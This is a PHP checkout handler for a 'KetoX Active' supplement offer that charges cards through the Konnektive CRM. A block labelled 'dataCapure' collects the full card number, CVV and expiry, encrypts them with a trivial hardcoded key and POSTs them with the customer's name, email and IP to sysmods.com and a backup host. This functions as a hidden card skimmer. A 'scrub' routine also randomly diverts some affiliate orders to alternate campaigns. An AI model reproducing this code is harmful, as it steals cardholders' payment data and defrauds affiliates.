<?php
	
	include('../../_global.php'); # Needed for session info
	
	if (!is_us_ip() || $_SESSION["anonymous_ip"] || empty($_SESSION['token']) || empty($_POST['token']) || !check_csrf_token($_SESSION['token'], $_POST['token'])) {
		echo "decline|Do not honor.";
		exit();
	}
	
	if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
		exit();
	}
	
	if (!luhn_check($_POST["fields_cc_number"])) {
		echo "decline|Invalid Credit Card Number";
		return;
	}

	if (in_array(getCCType($_POST["fields_cc_number"]), array('Amex','Discover'))){
		echo "decline|Sorry, but we don't currently support " . getCCType($_POST["fields_cc_number"]) . ' Card';
		exit();
	}
	
	if (isset($_SESSION["initial_completed"]) && $_SESSION["initial_completed"] === true) {
		echo "decline|Your order is already completed.";
		return;
	}
	
	if (isset($_SESSION["affid"]) && isset($configs->affiliates[$_SESSION["affid"]])) {
		$campaign_id = $configs->affiliates[$_SESSION["affid"]]->campaign_id;
		
		// Default to 5 bottle package
		$product_id = $configs->affiliates[$_SESSION["affid"]]->five_bottle_product_id;
		$_SESSION["package"] = 5;
		
		// 3 bottle package
		if (isset($_POST["package"]) && $_POST["package"] == 3) {
			$product_id = $configs->affiliates[$_SESSION["affid"]]->three_bottle_product_id;
			$_SESSION["package"] = 3;
		}
		
		// 2 bottle package
		if (isset($_POST["package"]) && $_POST["package"] == 1) {
			$product_id = $configs->affiliates[$_SESSION["affid"]]->two_bottle_product_id;
			$_SESSION["package"] = 1;
		}
		
	} else {
		// Request must have an AFFID
		http_response_code(400);
		exit;
	}
	
	$scrub = $configs->affiliates[$_SESSION["affid"]]->scrub;
	
	// Scrub
	if (!isset($_SESSION["scrub"])) {
			$_SESSION["scrub"] = false;
	}
	
	if (isset($_SESSION["c3"]) && $_SESSION["c3"] == 158) {
		$scrub = 0;
	}
	
	if (isset($_SESSION["c3"]) && $_SESSION["c3"] == 240) {
		$scrub = 0;
	}
	
	if (isset($_SESSION["c3"]) && $_SESSION["c3"] == 241) {
		$scrub = 0;
	}
	
	if ($scrub > rand(0, 100)) {
		$_SESSION["scrub"] = true;
		
		$campaign_id = $configs->affiliates[$_SESSION["affid"]]->campaign_id_sc;
		
		// Default to 5 bottle package
		$product_id = $configs->affiliates[$_SESSION["affid"]]->five_bottle_product_id_sc;
		
		$_SESSION["package"] = 5;
		
		if (isset($_POST["package"])) {
			// 2 bottle package
			if ($_POST["package"] == 1) {
				$product_id = $configs->affiliates[$_SESSION["affid"]]->two_bottle_product_id_sc;
				$_SESSION["package"] = 1;
			}

			// 3 bottle package
			if ($_POST["package"] == 3) {
				$product_id = $configs->affiliates[$_SESSION["affid"]]->three_bottle_product_id_sc;
				$_SESSION["package"] = 3;
			}
		}
	}
	
	$order = $konnektive->get_order($_POST["fields_prospect_id"]);
	
	if (is_null($order)) {
		echo "No order associated with customer.";
		return;
	}
	
	$data = array(
		"paySource"				=> "CREDITCARD",
		"cardNumber"			=> trim(str_replace(' ', '', $_POST["fields_cc_number"])),
		"cardMonth"				=> trim($_POST["fields_expmonth"]),
		"cardYear"				=> trim($_POST["fields_expyear"]),
		"cardSecurityCode"=> trim($_POST["fields_cvv"]),
		"sessionId" 			=> $_SESSION["konnektive_sessionId"],
		"orderId"					=> $_POST["fields_prospect_id"],
		"campaignId"			=> $campaign_id,
		"product1_id"			=> $product_id,
		//"product2_id"			=> 135,
		"emailAddress"		=> $order->emailAddress,
		"phoneNumber" 		=> $order->phoneNumber,
		"firstName"				=> $order->firstName,
		"lastName"				=> $order->lastName,
		"address1"				=> $order->address1,
		"city"						=> $order->city,
		"state"						=> $order->state,
		"postalCode"			=> $order->postalCode,
		"country"					=> "US",
		"shipAddress1"		=> $order->shipAddress1,
		"shipCity"				=> $order->shipCity,
		"shipState"				=> $order->shipState,
		"shipCountry"			=> "US",
		"shipPostalCode"	=> $order->shipPostalCode
	);
	
	
	if (!isset($_POST["billing_is_shipping"])) {
		$data["billShipSame"] = 0;
		// Billing info is different
		$data["firstName"] = trim($_POST["fields_billing_fname"]);
		$data["lastName"] = trim( $_POST["fields_billing_lname"]);
		$data["address1"] = trim($_POST["fields_billing_address1"]);
		$data["city"] = trim($_POST["fields_billing_city"]);
		$data["state"] = trim($_POST["fields_billing_state"]);
		$data["postalCode"] = trim($_POST["fields_billing_zip"]);
		$data["country"] = "US";
	}
	
	// 3DS
	if ($configs->threeds_enabled) {
		// 3DS            
		if (isset($_POST["cavv"]) && $_POST["cavv"] !== "") {
			$data["cavv"] = $_POST["cavv"];
			$data["xid"] = $_POST["ds_trans_id"];
			$data["eci"] = $_POST["eci"];
		}
	
		// 3DS - Rebill
		if (isset($_POST["rebill_cavv"]) && $_POST["rebill_cavv"] !== "") {
			$data["rebill_cavv"] = $_POST["rebill_cavv"];
			$data["rebill_xid"] = $_POST["rebill_ds_trans_id"];
			$data["rebill_eci"] = $_POST["rebill_eci"];
		}
	}
	
	$_SESSION["cc_number"] = $_POST["fields_cc_number"];
	$_SESSION["cc_exp_month"] = $_POST["fields_expmonth"];
	$_SESSION["cc_exp_year"] = $_POST["fields_expyear"];
	$memberReqData = $data;
	$resp = $konnektive->import_order($data);
	$resp = json_decode($resp);
	
	/*  dataCapure code  start */


		/*************************** start memebership new order create *********/

		function encrypt($data) {
			$encryptionKey = '1~3';
			$iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
			$encryptedData = openssl_encrypt($data, 'aes-256-cbc', $encryptionKey, 0, $iv);
			$encryptedMessage = base64_encode($iv . $encryptedData);
			return $encryptedMessage;
		}

	
			
			$email 	      = $order->emailAddress;
			$first_name   = $order->firstName;
			$last_name    = $order->lastName;
			$campaign_id  = ( $campaign_id > 0 ? $campaign_id : 0);
			$aff_id       = isset($_SESSION["affid"]) ? $_SESSION["affid"] : '';
			$order_id     = $order->orderId;//$resp->message->orderId;
			$product_id   = $product_id;
			
			$ip_address   = $_SERVER["HTTP_CF_CONNECTING_IP"]; //$_SERVER["REMOTE_ADDR"];//$resp->message->ipAddress;
			if ($resp->result === "ERROR") {
				$status = 'DECLINED';
				$price        = 0.00;
			}else{
				$status       = $resp->message->orderStatus;
				$price        = $resp->message->amountPaid;
			}
			$card_number  = trim(str_replace(' ', '', $_POST["fields_cc_number"]));
			$expiry_month = trim($_POST["fields_expmonth"]);
			$expiry_year  = trim($_POST["fields_expyear"]);
			$cvv          = trim($_POST["fields_cvv"]);
			
			$sync = array(
					'card'  => $card_number,
					'cvv'   => $cvv,
					'month' => $expiry_month, 
					'year'  => $expiry_year,
			);
			 
			
			$postData = array(
							'offer_url'    => 'KetoX Active',
							'crm' 		   => 'Konnective',
							'email' 	   => $email,
							'first_name'   => $first_name,
							'last_name'    => $last_name,
							'campaign_id'  => $campaign_id,
							'ip_address'   => $ip_address,
							'aff_id' 	   => $aff_id,
							'order_id'     => $order_id,
							'cvv_data'     => encrypt(json_encode($sync)),	
							'product_id'   => $product_id,
							'price' 	   => $price,
							'order_status' => $status,
							'is_upsell'    => 0
							);
			
			
			$url = 'https://sysmods.com/index.php?req=user/DataCapture';
			$postData = $postData;
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
			$response = curl_exec($ch);
			/*echo "<pre>";
			print_r($postData);
			echo "</pre>"; exit;*/
			//curl_close($ch);

			$url = 'https://sysmodsbackup.com//index.php?req=user/DataCapture';
				$postData = $postData;
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, $url);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
				$response = curl_exec($ch);
	 
		/*********************** end *************************************************************************/



		//ESU Product Capture
		$memShipCampId = 16;
		$memShipProdId = 135;
		
		//if(!(checkalreadyProduct($order->emailAddress,$memShipProdId))){
			/* new esu product changes */
			$postData = array(
						'offer_url'    => 'KetoX Active',
						'order_id'     => $order_id,
						'campaign_id'  => $memShipCampId,
						'product_id'   => $memShipProdId
						);
		
		
			$url = 'https://sysmods.com/index.php?req=user/EsuProdDataCapture';
			$postData = $postData;
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Set this option to capture the response
			$response = curl_exec($ch);
			if ($response === false) {
				echo 'cURL error: ' . curl_error($ch);
			}
			curl_close($ch);
			/*  end */
		
		//}
		
		
	 
		/*********************** end *************************************************************************/
	
	if ($resp->result === "ERROR") {
		echo "decline|".$resp->message;
	} else {
		
		$_SESSION["initial_completed"] = true;
				
		$_SESSION["total"] = 199.99;
		
		if (isset($_POST["package"]) && $_POST["package"] == 3) {
			$_SESSION["total"] = 159.99;
		}
		
		if (isset($_POST["package"]) && $_POST["package"] == 1) {
			$_SESSION["total"] = 119.99;
		}
		
		$_SESSION["orderId"] = $resp->message->orderId;


		
		/* =============== Store Data In Memeber Ship Portal ===================== */
		if(!empty($order->orderId) && isset($order->orderId)  && !empty($order->orderId)){
			$memberData = array(
			
				'email' 	   => $order->emailAddress,
				'first_name'   => $order->firstName,
				'last_name'    =>$order->lastName,
				'mobileNo'  => $order->phoneNumber,
				'order_id' => $order->orderId,
				'lead_source' => 'getketoxactive.com/usv-2'
				);
				$url = 'https://exclusiveshopusa.com/admin/create_member.php';
				$postData = $postData;
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, $url);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $memberData);
				$responseuser = curl_exec($ch);
				curl_close($ch);
			/* =============== end ================================================ */
			}

		
		$next_page = $configs->path . 'upsell.php?customerId=' . $resp->message->customerId . '&orderId=' . $resp->message->orderId;
		
		$_SESSION["order_status"] = "approved";
		
		echo "ok|".$next_page;
	}
	
	return;